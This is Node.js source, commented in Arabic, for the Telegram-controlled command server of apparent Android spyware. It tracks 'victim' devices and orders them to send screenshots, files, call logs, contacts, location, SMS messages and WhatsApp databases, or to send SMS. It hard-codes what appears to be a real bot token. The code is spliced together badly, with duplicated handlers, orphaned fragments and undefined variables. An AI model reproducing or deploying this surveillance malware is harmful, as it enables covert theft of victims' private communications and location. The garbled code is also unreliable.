const TelegramBot = require("node-telegram-bot-api");
const { Server } = require("socket.io");

// إعداد البوت
const token = "6306639467:AAG69iSWfHTUMudYjFTkFciQPkN_OP-tcv4";
const bot = new TelegramBot(token, { polling: true });

// إعداد Socket.IO
const io = new Server(3000, { cors: { origin: "*" } });

// قائمة الأجهزة المتصلة (مثال)
let victimList = {}; // { deviceId: socketId }
let victimData = {}; // { deviceId: { model, otherInfo } }

// --------- دوال مساعدة ---------

// عرض قائمة الأجهزة
function sendDevicesList(chatId) {
  const devices = Object.keys(victimList);
  if (devices.length === 0) {
    bot.sendMessage(chatId, "⚠️ لا يوجد أجهزة متصلة حالياً.");
    return;
  }

  const keyboard = devices.map((id) => [{ text: `${id}`, callback_data: `device_${id}` }]);
  bot.sendMessage(chatId, "📱 اختر الجهاز:", { reply_markup: { inline_keyboard: keyboard } });
}

// عرض لوحة تحكم جهاز
function sendDeviceControl(chatId, deviceId) {
  bot.sendMessage(chatId, `✅ اخترت الجهاز:\n🆔 ${deviceId}\n📱 ${victimData[deviceId]?.model || "غير معروف"}`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📸 لقطة شاشة", callback_data: `cmd_screenshot_${deviceId}` }],
        [{ text: "📂 الملفات", callback_data: `cmd_getDir_${deviceId}` }],
        [{ text: "📞 سجل المكالمات", callback_data: `cmd_getCallLog_${deviceId}` }],
        [{ text: "📱 التطبيقات", callback_data: `cmd_getInstalledApps_${deviceId}` }],
        [{ text: "👤 جهات الاتصال", callback_data: `cmd_getContacts_${deviceId}` }],
        [{ text: "📍 الموقع", callback_data: `cmd_getLocation_${deviceId}` }],
        [{ text: "📩 الرسائل", callback_data: `cmd_getSMS_${deviceId}` }],
        [{ text: "💬 أرسل SMS", callback_data: `cmd_sendSMS_${deviceId}` }],
        [{ text: "🔙 رجوع", callback_data: "back_to_devices" }]
      ]
    }
  });
}

// --------- أوامر البوت ---------
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "👋 مرحباً! اختر أحد الأوامر:", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📱 الأجهزة المتصلة", callback_data: "show_devices" }]
      ]
    }
  });
});

bot.onText(/\/devices/, (msg) => {
  sendDevicesList(msg.chat.id);
});

// --------- التعامل مع أزرار Inline ---------
bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  // عرض قائمة الأجهزة
  if (data === "show_devices" || data === "back_to_devices") {
    sendDevicesList(chatId);
    return;
  }

  // اختيار جهاز
  if (data.startsWith("device_")) {
    const deviceId = data.split("_")[1];
    sendDeviceControl(chatId, deviceId);
    return;
  }

  // أوامر الأجهزة
  if (data.startsWith("cmd_")) {
    const [ , command, deviceId ] = data.split("_");

    switch (command) {
      case "screenshot":
        io.to(victimList[deviceId]).emit("request", { type: "screenshot", id: deviceId });
        bot.sendMessage(chatId, `📸 جاري طلب لقطة شاشة من ${deviceId}...`);
        break;
      case "getDir":
        io.to(victimList[deviceId]).emit("request", { type: "getDir", id: deviceId });
        bot.sendMessage(chatId, `📂 جاري جلب الملفات من ${deviceId}...`);
        break;
      case "getCallLog":
        io.to(victimList[deviceId]).emit("request", { type: "getCallLog", id: deviceId });
        bot.sendMessage(chatId, `📞 جاري جلب سجل المكالمات من ${deviceId}...`);
        break;
      case "getInstalledApps":
        io.to(victimList[deviceId]).emit("request", { type: "getInstalledApps", id: deviceId });
        bot.sendMessage(chatId, `📱 جاري جلب التطبيقات المثبتة من ${deviceId}...`);
        break;
      case "getContacts":
        io.to(victimList[deviceId]).emit("request", { type: "getContacts", id: deviceId });
        bot.sendMessage(chatId, `👤 جاري جلب جهات الاتصال من ${deviceId}...`);
        break;
      case "getLocation":
        io.to(victimList[deviceId]).emit("request", { type: "getLocation", id: deviceId });
        bot.sendMessage(chatId, `📍 جاري جلب الموقع من ${deviceId}...`);
        break;
      case "getSMS":
        io.to(victimList[deviceId]).emit("request", { type: "getSMS", id: deviceId });
        bot.sendMessage(chatId, `📩 جاري جلب الرسائل من ${deviceId}...`);
        break;
      case "sendSMS":
        bot.sendMessage(chatId, `💬 أرسل رسالة لجهاز ${deviceId} باستخدام أمر خاص.`);
        break;
    }
  }
});

// --------- استقبال الأجهزة عبر Socket.IO ---------
io.on("connection", (socket) => {
  console.log(`⚡ جهاز متصل: ${socket.id}`);

  socket.on("register", (data) => {
    const { deviceId, model } = data;
    victimList[deviceId] = socket.id;
    victimData[deviceId] = { model };
    console.log(`✅ تم تسجيل الجهاز: ${deviceId} (${model})`);
  });

  socket.on("disconnect", () => {
    const deviceId = Object.keys(victimList).find(key => victimList[key] === socket.id);
    if (deviceId) {
      delete victimList[deviceId];
      delete victimData[deviceId];
      console.log(`❌ الجهاز فصل: ${deviceId}`);
    }
  });
});
  socket.on("disconnect", () => {
    if (socket.id === adminSocketId) {
      adminSocketId = null;
      notifyTelegram("⚠️ الأدمن قطع الاتصال!");
    } else {
      notifyTelegram(`❌ جهاز فقد الاتصال: ${socket.id}`);
    }
  });
});

// أوامر من التليجرام للتحكم
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (chatId != CHAT_ID) return; // تجاهل الرسائل من غيرك

  if (text.startsWith("/list")) {
    // إرسال قائمة الأجهزة
    let list = Object.keys(victimData)
      .map((id) => `🆔 ${id} | 📱 ${victimData[id].model}`)
      .join("\n");
    if (!list) list = "🚫 لا يوجد أجهزة متصلة";
    bot.sendMessage(chatId, list);
  }

  if (text.startsWith("/sms")) {
    const [_, deviceId, number, ...bodyArr] = text.split(" ");
    const body = bodyArr.join(" ");
    const victim = victimList[deviceId];
    if (victim) {
      io.to(victim).emit("request", {
        type: "sendSMS",
        number,
        body,
      });
      bot.sendMessage(chatId, `📤 إرسال SMS إلى ${number} من ${deviceId}`);
    } else {
      bot.sendMessage(chatId, "🚫 الجهاز غير متصل");
    }
  }
});      socket.on('getDir',(data)=>response("getDir",data));
      socket.on('getInstalledApps',(data)=>response("getInstalledApps",data));
      socket.on('getContacts',(data)=>response("getContacts",data));
      socket.on('sendSMS',(data)=>response("sendSMS",data));
      socket.on('getCallLog',(data)=>response("getCallLog",data));
      socket.on("previewImage", (data) =>response("previewImage",data));
      socket.on("error", (data) =>response("error",data));
      socket.on("getSMS", (data) =>response("getSMS",data));
      socket.on('getLocation',(data)=>response("getLocation",data));
     
      socket.on('disconnect', () => {
        if(socket.id===adminSocketId){
            adminSocketId=null
        }else{
            response("disconnectClient",socket.id)
            Object.keys(victimList).map((key)=>{
                if(victimList[key] === socket.id){
                  delete victimList[key]
                  delete victimData[key]
                }
              })
        }
    });
    
    socket.on("download", (d, callback) =>responseBinary("download", d, callback));
    socket.on("downloadWhatsappDatabase", (d, callback) => {
        socket.broadcast.emit("downloadWhatsappDatabase", d, callback);
       });


});

const request =(d)=>{
    let { to, action, data } = JSON.parse(d);
    log("Requesting action: "+ action);
    io.to(victimList[to]).emit(action, data);
  }

const response =(action, data)=>{
    if(adminSocketId){
        log("response action: "+ action);
        io.to(adminSocketId).emit(action, data);
    }
  }
  const responseBinary =(action, data, callback)=>{
    if(adminSocketId){
        log("response action: "+ action);
        callback("success")
        io.to(adminSocketId).emit(action, data);
    }
  }
 
const log = (log) =>{
    console.log(log)
  }
